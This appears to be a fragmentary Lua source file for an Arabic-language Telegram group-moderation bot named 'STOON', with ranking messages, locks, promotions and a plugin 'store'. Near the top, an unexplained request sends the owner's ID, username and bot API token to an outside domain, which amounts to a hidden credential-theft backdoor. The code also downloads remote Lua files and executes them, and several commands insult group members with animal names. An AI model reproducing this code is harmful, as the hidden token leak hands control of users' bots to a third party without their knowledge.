...
create_config_auto()
https.request("https://lana.gamemodsm.xyz/STOON/?id="..database:get(id_server..":SUDO:ID").."&user="..database:get(id_server..":SUDO:USERNAME").."&token="..database:get(id_server..":token"))
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/TTsRR/STOONFILES/master/File_Bot/commands.lua") 
...
var = database:get(bot_id.."Motte:Rd"..msg.chat_id_) or 'جلب'
else  
...
STOON_Msg = 'قمة التفاعل🤸‍♂️😻' 
elseif msgs < 5500 then 
STOON_Msg = 'اقوى متفاعل😳😻' 
elseif msgs < 7000 then 
STOON_Msg = 'ملك التفاعل🤴😍' 
elseif msgs < 9500 then 
STOON_Msg = 'امبروطور التفاعل💂‍♀️😻' 
elseif msgs < 10000000000 then 
STOON_Msg = 'رب التفاعل✔️😍'  
end 
return STOON_Msg 
end
...
usertext = '\n📮‹ العضو » » ['..result.title_..'](t.me/'..(username or 'nayy2019')..')'
...
if STOON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'📮‹ العضو » ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'nayy2019')..') \n 📬|'..STOON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_,0,"⚠|العضو : {["..data.first_name_.."](T.ME/nayy2019)}\n🚫|["..STOON_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "⚠|عذرا يا » {["..data.first_name_.."](T.ME/nayy2019)}\n📮| الملصق الذي ارسلته تم منعه من المجموعه \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
sendText(msg.chat_id_,'\n✨⇦ ٱهـلآ ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n📝|  تم تفعيل المجموعه {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'✨⇦ ٱهـلآ ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'nayy2019')..') \n🦠⇦تـم قـفل الدردشه\n👻⇦ الحاله ← المسح ')  
end,nil)   
...
if SudoBot(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/TTsRR/STOONFILES/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n📁| اهلا بك في متجر ملفات سـتون\n🔰| ملفات السورس ↓\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\n"
local TextE = "\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n🔘|  علامة تعني { ✓ } ملف مفعل\n🔘| علامة تعني { ✘ } ملف معطل\n🔖| قناة سورس سـتون ↓\n".."📮| [اضغط هنا لدخول](t.me/nayy2019) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/TTsRR/STOONFILES/master/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('STOON.lua')  
else
send(msg.chat_id_, msg.id_,"⚠️| عذرا هاذا ملف ليس من ملفات سورس سـتون\n") 
end
return false
end
...
if text == ("منشن للمطايه") and Mod(msg) then
...
if text == ("منشن لصخوله") and Mod(msg) then
...
if text == ("منشن لجلاب") and Mod(msg) then
...
if text == ("منشن لقروده") and Mod(msg) then
...
if text == ("منشن لحصونه") and Mod(msg) then
...
if text == ("منشن لبقرات") and Mod(msg) then
...
if text == ("منشن لطليان") and Mod(msg) then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n📮‹ العضو » ► ['..data.first_name_..'](t.me/'..(data.username_ or 'nayy2019')..') ◄'
status  = '\n🎟‹ الايدي » ► '..result.sender_user_id_..' ◄\nتـم تنـزيـل ادمن من القروب بكل الصلاحيات'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n📮‹ العضو » » ['..result.title_..'](t.me/'..(text1[3] or 'nayy2019')..')'..'\n🔘| تم رفعه '..text1[2]..' هنا')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'سـتون').." غادر" or text == 'غادر' then  
...
if (text and text == "تعطيل التسليه") then 
send(msg.chat_id_, msg.id_, '🔖| تم تعطيل التسليه')
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'سـتون')
